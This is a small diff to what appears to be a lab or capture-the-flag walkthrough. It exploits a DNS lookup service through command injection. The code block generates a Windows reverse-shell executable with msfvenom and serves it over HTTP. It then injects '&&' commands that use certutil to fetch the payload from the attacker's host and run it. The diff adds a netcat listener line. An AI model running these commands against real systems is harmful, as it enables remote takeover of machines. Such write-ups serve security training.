@@ -28,6 +28,7 @@ For background the DNS Querying Service is running nslookup and then querying th
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 python3 -m http.server 80
 && certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
+nc -nlvp 80
 && cmd /c C:\\Windows\\temp\\shell.exe
 ````
 
